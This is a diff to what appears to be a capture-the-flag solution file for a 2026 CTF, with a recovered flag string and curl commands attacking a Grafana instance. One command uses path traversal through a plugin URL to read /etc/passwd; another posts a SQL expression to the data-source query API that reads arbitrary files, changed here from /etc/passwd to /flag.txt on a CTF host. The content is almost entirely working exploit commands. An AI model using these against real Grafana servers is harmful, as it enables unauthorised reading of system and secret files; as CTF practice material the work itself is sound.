@@ -313,7 +313,7 @@ dalCTF{WhY_$O_L0N5}
 curl --path-as-is "https://ТВОЙ_URL/public/plugins/welcome/../../../../../../../../etc/passwd"
 
 
-curl -X POST "https://ТВОЙ_URL/api/ds/query" \
+curl -X POST "https://dalctf-grafana-jitsu-39-64616c.instancer.dalctf2026.com/api/ds/query" \
 -H "Content-Type: application/json" \
 -d '{
   "queries": [
@@ -324,7 +324,7 @@ curl -X POST "https://ТВОЙ_URL/api/ds/query" \
         "type": "__expr__"
       },
       "type": "sql",
-      "expression": "SELECT * FROM read_csv_auto('\''/etc/passwd'\'')"
+      "expression": "SELECT * FROM read_csv_auto('\''/flag.txt'\'', header=false)"
     }
   ]
 }'
